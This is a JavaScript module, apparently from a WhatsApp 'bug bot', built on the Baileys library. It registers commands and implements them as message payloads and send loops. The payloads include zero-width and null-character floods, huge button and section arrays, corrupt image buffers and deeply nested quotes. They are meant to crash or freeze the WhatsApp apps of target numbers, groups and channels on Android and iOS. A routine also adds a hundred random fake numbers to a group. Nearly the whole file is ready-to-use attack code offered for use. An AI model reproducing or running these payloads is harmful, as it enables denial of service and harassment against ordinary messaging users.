import chalk from "chalk";
import { generateWAMessageFromContent } from "@whiskeysockets/baileys";

// ========================================================================
// ============================== HELPERS =================================
// ========================================================================

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const getRandomDelay = (min, max) =>
  Math.floor(Math.random() * (max - min + 1)) + min;

// ========================================================================
// =========================== TRAVAS REGISTRY ============================
// ========================================================================

function normalizeTravasEntry(entry) {
  const key = String(entry.key);
  return {
    key,
    command: entry.command || key,
    label: String(entry.label || key),
    type: String(entry.type || "number"),
    description: String(entry.description || ""),
    risk: entry.risk || "🟢",
    run: entry.run,
  };
}

export const TRAVAS_REGISTRY = [];

export function addTravas(entry) {
  const item = normalizeTravasEntry(entry);
  const index = TRAVAS_REGISTRY.findIndex((row) => row.key === item.key);
  if (index >= 0) {
    TRAVAS_REGISTRY[index] = item; // update kalau sudah ada
  } else {
    TRAVAS_REGISTRY.push(item);
  }
  return item;
}

export function removeTravas(key) {
  const target = String(key || "");
  const index = TRAVAS_REGISTRY.findIndex((row) => row.key === target);
  if (index >= 0) TRAVAS_REGISTRY.splice(index, 1);
  return index >= 0;
}

[
  // ----------------------------- NUMBER ACTIONS -----------------------------
  {
    key: "xcombo",
    command: "xcombo",
    label: "Android crash slow",
    type: "number",
    description: "Crash UI Android",
    risk: "🔴",
    run: async ({ sock, target }) => VonixCross(sock, target),
  },
  {
    key: "vxdelay",
    command: "vxdelay",
    label: "Delay-X2",
    type: "number",
    description: "Delay-X2 status flood",
    risk: "🟢",
    run: async ({ sock, target }) => BuldozerNew(sock, target),
  },
  {
    key: "freeze",
    command: "freeze",
    label: "Freeze payload",
    type: "number",
    description: "Freeze payload / crash block",
    risk: "🔴",
    run: async ({ sock, target }) => freeze(sock, target),
  },
  {
    key: "ios",
    command: "ios",
    label: "IOS basic message",
    type: "number",
    description: "iOS rich-message flood",
    risk: "🔴",
    run: async ({ sock, target }) => ios(sock, target),
  },

  // ----------------------------- GROUP ACTIONS -----------------------------
  {
    key: "group_crash",
    command: "crashgb",
    label: "Group crash",
    type: "group",
    description: "Group crash payload",
    risk: "🟡",
    run: async ({ sock, target }) => crash_grup(sock, target),
  },
  {
    key: "group_freeze",
    command: "freezegb",
    label: "Group freeze",
    type: "group",
    description: "Group freeze payload",
    risk: "🔴",
    run: async ({ sock, target }) => GroupFreeze(sock, target),
  },
  {
    key: "group_ban",
    command: "bangb",
    label: "Group ban",
    type: "group",
    description: "Group ban participant loop",
    risk: "🔴",
    run: async ({ sock, target }) => groupBan1(sock, target),
  },

  // ----------------------------- CHANNEL ACTIONS -----------------------------
  {
    key: "channel",
    command: "channel",
    label: "Channel crash",
    type: "channel",
    description: "Channel crash payload",
    risk: "🟢",
    run: async ({ sock, target }) => crash_ch(sock, target),
  },
].forEach((entry) => addTravas(entry));

// ========================================================================
// ============================ NUMBER PAYLOADS ===========================
// ========================================================================

// ================================ ( VONIX CROSS ) ================================ \\
async function VonixCross(sock, target) {
  // Loop 50 iterasi internal + durasi 6 jam di versi asli itu inkonsisten.
  // Di sini kita buat loop 50 iterasi saja, tanpa while dalam-dalam,
  // supaya tidak menggantung proses.
  const INTERVAL_MS = 5000;
  const ITERATIONS = 50;

  const code = "\u200C\u200D\u200B\u200A\u0000\x930\u500B";

  const repeatPayload = () => ({
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: { text: " " },
          nativeFlowMessage: {
            buttons: "\u0000" + "\u3164".repeat(500000),
            nativeFlowResponseMessage: {
              buttons: Array.from({ length: 123456 }, () => ({})),
            },
          },
        },
      },
    },
  });

  const crashMsg = () => ({
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: { text: "\u927D" },
          header: { title: "\u200B" },
          nativeFlowMessage: {
            buttons: "one_crash_message".repeat(15000),
          },
        },
      },
    },
  });

  const msg4 = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "Crashꦾ" + code.repeat(1000),
            display_text: "\u200C",
          },
          nativeFlowInfo: {
            name: "single_select",
            paramsJson: JSON.stringify({
              icon: "document",
              title: "Rena?!",
              sections: Array.from({ length: 505555 }, () => ({})),
            }),
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({})),
          },
        },
      },
    },
  };

  const msg5 = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text:
              "Rena" +
              " ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ,𑇂𑆵𑆴𑆿".repeat(75000),
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({})),
          },
        },
      },
    },
  };

  const payloads = [
    repeatPayload(),
    repeatPayload(),
    repeatPayload(),
    repeatPayload(),
    repeatPayload(),
  ];

  for (let i = 0; i < ITERATIONS; i++) {
    try {
      for (const p of payloads) {
        await sock.relayMessage(target, p, { noSelfSync: true });
      }
      await sock.relayMessage(target, crashMsg(), { noSelfSync: true });
      await sock.relayMessage(target, crashMsg(), { noSelfSync: true });
      await sock.relayMessage(target, crashMsg(), { noSelfSync: true });
      await sock.relayMessage(target, msg4, { noSelfSync: true });
      await sock.relayMessage(target, msg5, { noSelfSync: true });
    } catch (err) {
      console.log(chalk.red(`❌ [VONIX ${i + 1}/${ITERATIONS}] ${err.message}`));
    }

    await sleep(INTERVAL_MS);
  }

  console.log(
    chalk.yellow(`📊 [VONIX] Selesai ${ITERATIONS}x → ${target}`)
  );
}

// ================================ ( BULDOZER NEW ) ================================ \\
async function BuldozerNew(sock, target) {
  const ITERATIONS = 5; // diturunkan dari 50 biar nggak nge-hang
  const REACT_LOOP = 30; // diturunkan dari 150

  try {
    for (let i = 0; i < ITERATIONS; i++) {
      const corruptBuffer = Buffer.from([
        0xff, 0xd8, 0xff, 0xe0,
        ...Array(100000).fill(0x00),
      ]);

      await sock.sendMessage(target, {
        image: corruptBuffer,
        caption: "\u200b".repeat(200000),
      });

      for (let j = 0; j < REACT_LOOP; j++) {
        await sock.sendMessage(target, {
          react: {
            text: "Monkey".repeat(5000),
            key: { remoteJid: target },
          },
        });
      }

      await sock.sendMessage(target, {
        location: {
          degreesLatitude: 999999999,
          degreesLongitude: 999999999,
        },
      });
    }

    console.log(chalk.green(`✅ [BULDOZER] Selesai → ${target}`));
  } catch (err) {
    console.log(chalk.red(`❌ [BULDOZER] ${err.message}`));
  }
}

// ================================ ( FREEZE ) ================================ \\
async function freeze(sock, target) {
  // Bangun semua payload SEKALI di luar loop, biar nggak rebuild tiap iterasi.
  const payloads = [
    {
      newsletterAdminInviteMessage: {
        newsletterJid: target,
        newsletterName: "\u0000".repeat(80000),
        caption: "\u200B".repeat(80000) + "\u2063".repeat(40000),
        inviteExpiration: "9999999999999",
        jpegThumbnail: Buffer.from("\u0000".repeat(50000)),
        contextInfo: {
          mentionedJid: [target],
          forwardingScore: 9999,
          isForwarded: true,
        },
      },
    },
    {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: { text: "\u2063".repeat(100000) },
            nativeFlowMessage: {
              name: "galaxy_message",
              buttons: Array.from({ length: 200000 }, () => ({
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "\u200B".repeat(300),
                  id: "\u0000".repeat(300),
                }),
              })),
              extra: "\u0000".repeat(80000),
              flow_action: "navigate",
              flow_cta: "\u2063",
            },
            header: {
              title: "\u3164".repeat(50000),
              subtitle: "\u3164".repeat(50000),
              hasMediaAttachment: true,
              mediaAttachment: {
                url: "https://mmg.whatsapp.net/v/t62.7161-24/30566750_1857105954891876_3816939022397797459_n.enc",
                mimetype: "image/webp",
                fileSha256: "Vbqeh2lor8Jw03cFXxKlG0Z8ov9a8WOEkviuZSVSn6A=",
                fileLength: "999999999999",
                height: 999999,
                width: 999999,
              },
            },
          },
        },
      },
    },
    {
      pollCreationMessageV3: {
        name: "\u200B".repeat(50000),
        options: Array.from({ length: 5000 }, () => ({
          optionName: "\u0000".repeat(1000),
        })),
        selectableOptionsCount: 999999,
        pollContentType: 0,
        pollType: 0,
        correctAnswer: { optionName: "\u2063".repeat(50000) },
        contextInfo: {
          mentionedJid: [target],
          forwardingScore: 9999,
          isForwarded: true,
        },
      },
    },
    {
      reactionMessage: {
        key: {
          remoteJid: target,
          fromMe: false,
          id: "\u0000".repeat(50000),
        },
        text: "\u2063".repeat(100000) + "\u200B".repeat(50000),
        groupingKey: "\u0000".repeat(80000),
        senderTimestampMs: "9999999999999",
      },
    },
    {
      protocolMessage: {
        key: {
          remoteJid: target,
          fromMe: false,
          id: "\u0000".repeat(50000),
        },
        type: 14,
        editedMessage: {
          conversation: "\u2063".repeat(150000) + "\u0000".repeat(100000),
        },
        timestampMs: "9999999999999",
      },
    },
    {
      interactiveMessage: {
        body: { text: "\u2063".repeat(80000) },
        carouselMessage: {
          cards: Array.from({ length: 500 }, () => ({
            header: {
              title: "\u3164".repeat(20000),
              subtitle: "\u3164".repeat(20000),
              hasMediaAttachment: true,
              imageMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7161-24/30566750_1857105954891876_3816939022397797459_n.enc",
                mimetype: "image/webp",
                fileSha256: "Vbqeh2lor8Jw03cFXxKlG0Z8ov9a8WOEkviuZSVSn6A=",
                fileLength: "999999999999",
                height: 999999,
                width: 999999,
              },
            },
            body: { text: "\u0000".repeat(30000) },
            nativeFlowMessage: {
              buttons: Array.from({ length: 1000 }, () => ({
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "\u200B".repeat(200),
                  url: "https://t.me/" + "A".repeat(500),
                }),
              })),
            },
          })),
        },
      },
    },
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: "\u2063".repeat(120000) },
            nativeFlowMessage: {
              name: "call_permission_request",
              buttons: "\u0000".repeat(150000),
              extra: "\u200B".repeat(100000),
              flow_action: "navigate",
              flow_cta: "\u2063",
            },
          },
        },
      },
    },
    {
      interactiveMessage: {
        body: {
          text: "\u2063".repeat(200000) + "\u200B".repeat(100000),
        },
        nativeFlowMessage: {
          buttons: Array.from({ length: 500000 }, () => ({})),
          buttonParamsJson: "{".repeat(150000),
          extra: "\u0000".repeat(120000),
        },
        header: {
          title: "\u3164".repeat(100000),
          subtitle: "\u3164".repeat(100000),
          hasMediaAttachment: true,
          mediaAttachment: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/30566750_1857105954891876_3816939022397797459_n.enc",
            mimetype: "image/webp",
            fileSha256: "Vbqeh2lor8Jw03cFXxKlG0Z8ov9a8WOEkviuZSVSn6A=",
            fileLength: "999999999999",
            height: 999999,
            width: 999999,
          },
        },
      },
    },
  ];

  let success = 0;
  let fail = 0;
  for (let i = 0; i < payloads.length; i++) {
    try {
      await sock.relayMessage(target, payloads[i], {});
      success++;
    } catch (err) {
      fail++;
      console.log(chalk.red(`❌ [FREEZE ${i + 1}/${payloads.length}] ${err.message}`));
    }
  }

  console.log(
    chalk.yellow(
      `📊 [FREEZE] Selesai ✅ ${success} | ❌ ${fail} → ${target}`
    )
  );
}

// ================================ ( IOS ) ================================ \\
async function ios(sock, target) {
 await sock.relayMessage(target, {
    botInvokeMessage: {
      message: {
        interactiveResponseMessage: {
          nativeFlowResponseMessage: {
            name: "send_location",
            paramsJson: "\0".repeat(1045000),
            version: 3
          },
          contextInfo: {
            entryPointConversionSource: "call_permission_request",
            isForwarded: true,
            isSampled: true,
            remoteJid: "status@broadcast",
            stanzaId: null,
            mentionedJid: [`0@${"\0".repeat(1000)}`],
            productListInfo: {
              productList: Array(90000).fill({
                productId: "ꦾ".repeat(5000),
                title: "ꦾ".repeat(55000)
              })
            },
            deviceListMetadata: {
              senderKeyHash: Buffer.alloc(1048576, 0),
              senderTimestamp: "1743225419",
              recipientKeyHash: Buffer.alloc(1048576, 0),
              recipientTimestamp: "1743225419"
            },
            deviceListMetaDataVersion: 2
          }
        }
      }
    }
  }, {
    participant: true,
    messageId: null
  });
} 

// ================================ ( UI ) ================================ \\
async function UI(sock, target) {
  console.log(chalk.blue(`🖥️ [UI] Mulai kirim ke ${target}`));

  let successCount = 0;
  let failCount = 0;

  for (let i = 0; i < 50; i++) {
    try {
      const buttons = Array.from({ length: 1000 }, (_, idx) => ({
        name: "quick_reply",
        buttonParamsJson: JSON.stringify({
          display_text: `lynnhama ${idx + 1} ` + "ꦾ".repeat(100),
          id: `lyn_btn_${idx + 1}_${Date.now()}`,
        }),
      }));

      const payload = {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "ꦾꦾꦾꦾ".repeat(3000),
                hasMediaAttachment: false,
              },
              body: { text: "ꦾꦾꦾꦾ".repeat(9999) },
              footer: { text: "Lynnnotip" },
              nativeFlowMessage: { buttons, messageVersion: 1 },
              contextInfo: {
                isForwarded: true,
                forwardingScore: 999999,
                quotedMessage: {
                  extendedTextMessage: {
                    text: "ꦾꦾꦾ".repeat(5000),
                    backgroundArgb: 0xff000000,
                    textArgb: 0xffffffff,
                    font: 1,
                  },
                },
              },
            },
          },
        },
      };

      const message = await generateWAMessageFromContent(target, payload, {
        ephemeralExpiration: 0,
        forwardingScore: 999999,
        isForwarded: true,
      });

      message.key.fromMe = false;

      await sock.relayMessage(target, message.message, {
        messageId: `UI_${Date.now()}_${i}`,
        noSelfSync: true,
        cached: false,
      });

      successCount++;
      console.log(chalk.green(`✅ [UI ${i + 1}/50] sukses → ${target}`));
    } catch (err) {
      failCount++;
      console.log(chalk.red(`❌ [UI ${i + 1}/50] gagal: ${err.message}`));
    }

    await sleep(getRandomDelay(100, 1000));
  }

  console.log(
    chalk.yellow(
      `📊 [UI] Selesai! ✅ ${successCount} | ❌ ${failCount} → ${target}`
    )
  );
}

// ========================================================================
// ============================ GROUP PAYLOADS ============================
// ========================================================================

// ================================ ( GROUP FREEZE ) ================================ \\
async function GroupFreeze(sock, target) {
  if (!target.endsWith("@g.us")) {
    console.log("❌ Target bukan group!");
    return { success: false, message: "Target is not a group!" };
  }

  const message = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: { text: "The Anomoyus team" },
          nativeFlowMessage: {
            buttons: "@RenaOffc".repeat(500000),
          },
          contextInfo: {
            quotedMessage: { stickerPackMessage: {} },
          },
        },
      },
    },
  };

  try {
    await sock.relayMessage(target, message, {});
    console.log(chalk.green(`✅ [GROUP FREEZE] Bug berhasil dikirim ke ${target}`));
    return { success: true, message: "Bug sent successfully" };
  } catch (error) {
    console.error(chalk.red(`❌ [GROUP FREEZE] Gagal ke ${target}:`), error.message);
    return { success: false, message: error.message || "Failed to send bug" };
  }
}

// ================================ ( GROUP CRASH ) ================================ \\
async function crash_grup(sock, target) {
  const quantia = 70;
  const tempo = 200;
  let success = 0;
  let fail = 0;

  console.log(
    chalk.blue(
      `🚀 [GROUP CRASH] Mulai kirim ${quantia} pesan ke ${target} (interval ${tempo}ms)`
    )
  );

  const payload = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            title: "p".repeat(50000),
            subtitle: "\u0010".repeat(50000),
            bloksWidget: {
              uuid: "\u200B".repeat(50000),
              data: "[".repeat(50000),
              type: "\u200F".repeat(50000),
              fallback: "\u200D".repeat(50000),
            },
          },
          body: { text: "\u000F" },
          nativeFlowMessage: { buttons: [{}] },
        },
      },
    },
  };

  for (let i = 0; i < quantia; i++) {
    sock
      .relayMessage(target, payload, { participant: { jid: target } })
      .then(() => {
        success++;
        console.log(
          chalk.green(
            `✅ [GROUP CRASH ${i + 1}/${quantia}] sukses (✅ ${success} | ❌ ${fail})`
          )
        );
      })
      .catch((err) => {
        fail++;
        console.log(
          chalk.red(
            `❌ [GROUP CRASH ${i + 1}/${quantia}] gagal: ${err.message} (✅ ${success} | ❌ ${fail})`
          )
        );
      });

    await sleep(tempo);
  }

  console.log(
    chalk.yellow(
      `📊 [GROUP CRASH] Selesai. ✅ ${success} | ❌ ${fail} → ${target}`
    )
  );
}

// ================================ ( GROUP BAN ) ================================ \\
async function groupBan1(sock, jid) {
  try {
    if (!jid.endsWith("@g.us")) throw new Error("Grup only");

    // Nomor fake valid-range Indonesia (62xxx)
    const fakeNumbers = Array.from({ length: 100 }, () => {
      const n = Math.floor(100000000 + Math.random() * 899999999);
      return `62${n}@s.whatsapp.net`;
    });

    for (const fakeJid of fakeNumbers) {
      sock.groupParticipantsUpdate(jid, [fakeJid], "add").catch(() => {});
      await sleep(30);
    }

    console.log(chalk.green(`✅ [GROUP BAN] Selesai → ${jid}`));
  } catch (err) {
    throw new Error(`bngc: ${err.message}`);
  }
}

// ========================================================================
// =========================== CHANNEL PAYLOADS ===========================
// ========================================================================

async function crash_ch(sock, x) {
  console.log(chalk.blue(`💥 [CHANNEL] Mulai kirim ke ${x}`));

  let successCount = 0;
  let failCount = 0;

  function peler(index = 1000) {
    let q = { conversation: "\0" };
    for (let i = 0; i < index; i++) {
      q = {
        extendedTextMessage: {
          text: "\0",
          contextInfo: { quotedMessage: q },
        },
      };
    }
    return q;
  }

  const msg = {
    extendedTextMessage: {
      text: "\0",
      contextInfo: {
        remoteJid: "\0",
        quotedMessage: {
          extendedTextMessage: {
            text: "\0",
            contextInfo: { quotedMessage: peler() },
          },
        },
      },
    },
  };

  for (let i = 0; i < 50; i++) {
    try {
      await sock.relayMessage(x, msg, {
        messageId: `CHANNEL_${Date.now()}_${i}`,
        participant: { jid: x },
      });

      successCount++;
      console.log(chalk.green(`✅ [CHANNEL ${i + 1}/50] sukses → ${x}`));
    } catch (err) {
      failCount++;
      console.log(chalk.red(`❌ [CHANNEL ${i + 1}/50] gagal: ${err.message}`));
    }

    await sleep(getRandomDelay(2000, 5000));
  }

  console.log(
    chalk.yellow(
      `📊 [CHANNEL] Selesai! ✅ ${successCount} | ❌ ${failCount} → ${x}`
    )
  );
}

// ========================================================================
// =========================== REGISTRY HELPERS ===========================
// ========================================================================

export function getTravasRegistry() {
  return TRAVAS_REGISTRY.map((item) => ({ ...item }));
}

export function getTravasEntry(key) {
  return TRAVAS_REGISTRY.find((item) => item.key === key) || null;
}

export function getTravasByType(type) {
  return TRAVAS_REGISTRY.filter((item) => item.type === type);
}

export function normalizeTravasTarget(type, raw) {
  const value = String(raw ?? "").trim();
  if (!value) return "";

  if (type === "number") {
    const digits = value.replace(/\D/g, "");
    if (!digits) return "";
    return digits.includes("@") ? digits : `${digits}@s.whatsapp.net`;
  }

  if (type === "group") {
    if (value.includes("@g.us")) return value;
    if (value.includes("chat.whatsapp.com/")) return value;

    const invite = value
      .replace(/^https?:\/\//i, "")
      .replace(/.*chat\.whatsapp\.com\//i, "")
      .split("?")[0]
      .trim();
    return invite || value;
  }

  if (type === "channel") {
    const digits = value.replace(/\D/g, "");
    if (!digits) return "";
    return digits.includes("@") ? digits : `${digits}@newsletter`;
  }

  return value;
}

export async function resolveGroupInviteTarget(sock, raw) {
  const value = String(raw ?? "").trim();
  if (!value) return "";
  if (value.includes("@g.us")) return value;

  let invite = value;
  if (value.includes("chat.whatsapp.com/")) {
    invite = value.split("chat.whatsapp.com/")[1]?.split("?")[0] || "";
  } else {
    invite = value
      .replace(/^https?:\/\//i, "")
      .replace(/.*chat\.whatsapp\.com\//i, "")
      .split("?")[0]
      .trim();
  }

  if (!invite) return "";
  if (typeof sock?.groupAcceptInvite !== "function") return "";

  try {
    const result = await sock.groupAcceptInvite(invite);
    const jid = String(result ?? "").trim();
    return jid.endsWith("@g.us") ? jid : "";
  } catch (error) {
    console.log("[resolveGroupInviteTarget]", error?.message || error);
    return "";
  }
}

// ========================================================================
// ============================== EXPORTS ================================
// ========================================================================

const travas = {
  // fungsi utama
  ios,
  UI,
  VonixCross,
  BuldozerNew,
  freeze,
  groupBan1,
  GroupFreeze,
  crash_grup,
  crash_ch,

  // registry
  TRAVAS_REGISTRY,
  addTravas,
  removeTravas,
  getTravasRegistry,
  getTravasEntry,
  getTravasByType,
  normalizeTravasTarget,
  resolveGroupInviteTarget,
};

export default travas;